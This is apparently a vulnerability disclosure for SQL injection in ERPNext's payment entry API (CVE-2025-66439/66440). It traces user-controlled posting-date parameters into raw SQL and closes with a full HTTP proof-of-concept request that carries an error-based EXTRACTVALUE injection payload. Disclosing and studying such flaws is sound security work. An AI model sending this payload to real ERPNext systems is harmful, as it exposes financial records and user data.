**Exploit Author: An Chu ( aka iamanc )**

**Vendor of Product: ERPNEXT**

**Affected Version:** ERPNext ≤ 15.89.0

**CVE:  CVE-2025-66439 & CVE-2025-66440.**

**Summary**:
An issue was discovered in Frappe ERPNext 15.89.0. Function get_outstanding_reference_documents() at erpnext/accounts/doctype/payment_entry/payment_entry.py is vulnerable to SQL Injection. It allows an attacker to extract arbitrary data from the database by injecting SQL payloads via the to_posting_date and from_posting_date parameter, which is directly interpolated into the query without proper sanitization or parameter binding.
**Impact:** An authenticated attacker can exploit this vulnerability to execute arbitrary SQL queries, allowing disclosure of sensitive database contents, including financial records and user-related data. This may lead to further compromise of the ERP system.

**The story:**

While reviewing ERPNext’s accounting module, I focused on endpoints exposed via `@frappe.whitelist()` decorators. These endpoints are callable directly via HTTP requests and often process user input.

During analysis of the *Payment Entry* workflow, I noticed that date parameters were passed from the HTTP request directly into a dynamically constructed SQL query. Further testing confirmed that these parameters were **not sanitized nor parameterized**, making them exploitable for SQL Injection.

**Technical Details::**

ERPNext is an open-source ERP system built on the Frappe Framework, which is written in Python and uses MariaDB/MySQL as its backend database..

**HTTP Routing in Frappe**

- Frappe exposes backend Python functions through HTTP endpoints.
- The endpoint format is :

```php
/api/method/<python.module.path>.<function_name>
```

•  When a request is sent to this URL, Frappe resolves the module path and **executes the corresponding Python function directly**.

**@frappe.whitelist()**

- The `@frappe.whitelist()` decorator **exposes a Python function as a public HTTP API**.
- Whitelisted functions:
    - Accept parameters directly from user-controlled HTTP requests
    - Do not enforce input validation by default
- This decorator defines the **attack entry point** for this vulnerability.

Example: 

Source code

```php
@frappe.whitelist()
def test(a, b):
    return a + b
```

Request

```php
POST /api/method/module.test
a=1&b=2
```

**Database Query Execution in Frappe**

Frappe provides multiple helper functions to execute SQL queries directly against the database.

The most commonly used function is:

```python
frappe.db.sql()
```

`frappe.db.sql()` executes **raw SQL queries**

Example source code unsafe:

```php
frappe.db.sql(
    f"SELECT name FROM tabUser WHERE email = '{email}'"
)
```

If `email` is user-controlled, this leads to **SQL Injection**.
Vulnerable Execution Flow:

<img width="436" height="618" alt="image" src="https://github.com/user-attachments/assets/da9023ba-2130-4c04-8e1f-639ea82e83c0" />


Vulnerable Code Analysis (SQL Injection):

Source code file:  erpnext\accounts\doctype\payment_entry\payment_entry.py

Function get_outstanding_reference_documents()

```php
@frappe.whitelist()
def get_outstanding_reference_documents(args, validate=False):
	if isinstance(args, str):
		args = json.loads(args)

	[...TRUNCATED...]

	# dynamic dimension filters
	active_dimensions = get_dimensions()[0]
	for dim in active_dimensions:
		if args.get(dim.fieldname):
			condition += f" and {dim.fieldname}='{args.get(dim.fieldname)}'"
			accounting_dimensions_filter.append(ple[dim.fieldname] == args.get(dim.fieldname))

	date_fields_dict = {
		"posting_date": ["from_posting_date", "to_posting_date"],
		"due_date": ["from_due_date", "to_due_date"],
	}

	for fieldname, date_fields in date_fields_dict.items():
		if args.get(date_fields[0]) and args.get(date_fields[1]):
			condition += " and {} between '{}' and '{}'".format(
				fieldname, args.get(date_fields[0]), args.get(date_fields[1])
			)
			posting_and_due_date.append(ple[fieldname][args.get(date_fields[0]) : args.get(date_fields[1])])
			
		[.......TRUNCATED......]
		if args.get("party_type") != "Employee":
			negative_outstanding_invoices = get_negative_outstanding_invoices(
				args.get("party_type"),
				args.get("party"),
				args.get("party_account"),
				party_account_currency,
				company_currency,
				condition=condition,
			)	
def get_negative_outstanding_invoices(
	party_type,
	party,
	party_account,
	party_account_currency,
	company_currency,
	cost_center=None,
	condition=None,
):
	if party_type not in ["Customer", "Supplier"]:
[.......TRUNCATED......]

	return frappe.db.sql(
		"""
		select
			"{voucher_type}" as voucher_type, name as voucher_no, {account} as account,
			if({rounded_total_field}, {rounded_total_field}, {grand_total_field}) as invoice_amount,
			outstanding_amount, posting_date,
			due_date, conversion_rate as exchange_rate
		from
			`tab{voucher_type}`
		where
			{party_type} = %s and {party_account} = %s and docstatus = 1 and
			outstanding_amount < 0
			{supplier_condition}
			{condition}
		order by
			posting_date, name
		""".format(
			**{
				"supplier_condition": supplier_condition,
				"condition": condition,
				"rounded_total_field": rounded_total_field,
				"grand_total_field": grand_total_field,
				"voucher_type": voucher_type,
				"party_type": scrub(party_type),
				"party_account": "debit_to" if party_type == "Customer" else "credit_to",
				"cost_center": cost_center,
				"account": account,
			}
		),
		(party, party_account),
		as_dict=True,
	)		
```

**Vulnerability Explanation:** 

The SQL Injection vulnerability is caused by unsafe handling of the from_posting_date and to_posting_date parameters inside a whitelisted ERPNext backend function.

1. **User-Controlled Parameters**

The function get_outstanding_reference_documents() is exposed via @frappe.whitelist() and accepts the args parameter directly from an HTTP request.

The following parameters are fully user-controlled:

from_posting_date

to_posting_date

These values are not validated or sanitized before use.

1. **Vulnerable SQL Construction**

The parameters are directly interpolated into an SQL condition using string formatting:

```php
condition += " and {} between '{}' and '{}'".format(
fieldname, args.get(date_fields[0]), args.get(date_fields[1])
)
```

Because from_posting_date and to_posting_date are inserted into the SQL query inside quotes, an attacker can inject arbitrary SQL by breaking out of the string context.

1. **SQL Injection Execution**

The constructed condition string is passed to another backend function:

```php
get_negative_outstanding_invoices(..., condition=condition)
```

Inside this function, the injected SQL fragment is concatenated into a raw SQL query and executed via:

`frappe.db.sql(...)`

Although some query parameters use placeholders (%s), the injected condition is not parameterized and is executed directly by the database.

**POC:** 
Request:
```php
POST /api/method/erpnext.accounts.doctype.payment_entry.payment_entry.get_outstanding_reference_documents HTTP/1.1
Host: localhost:8282
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8282/app/payment-entry/new-payment-entry-zouneqfulr
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Frappe-CSRF-Token: a3f8f6b0b7c31f4d1a55af0ea5acf9acf25b376d5faae249f5dedcc2
X-Frappe-CMD: 
X-Requested-With: XMLHttpRequest
Content-Length: 569
Origin: http://localhost:8282
Connection: keep-alive
Cookie: sid=59fb06e9f790bdd8eb82c2a62f4e6b9ee5c8a59782b26db48adbf4ee; system_user=yes; full_name=Administrator; user_id=Administrator; user_image=
Priority: u=0

args=%7b%20%20%22posting_date%22%3a%222025-07-15%22%2c%20%20%22company%22%3a%22A%22%2c%20%20%22party_type%22%3a%22Supplier%22%2c%20%20%22payment_type%22%3a%22Pay%22%2c%20%20%22party%22%3a%22SUP-0001%22%2c%20%20%22party_account%22%3a%22Creditors%20-%20A%22%2c%20%20%22from_posting_date%22%3a%222025-06-15'%20AND%20EXTRACTVALUE(1%2c%20CONCAT(0x7e%2c%20VERSION()%2c%200x7e))%20--%20%22%2c%20%20%22to_posting_date%22%3a%222025-07-15%22%2c%20%20%22outstanding_amt_greater_than%22%3a0%2c%20%20%22allocate_payment_amount%22%3a1%2c%20%20%22get_outstanding_invoices%22%3atrue%7d
```

<img width="1500" height="350" alt="image" src="https://github.com/user-attachments/assets/eabe0029-7872-4548-a8a9-57af19519812" />
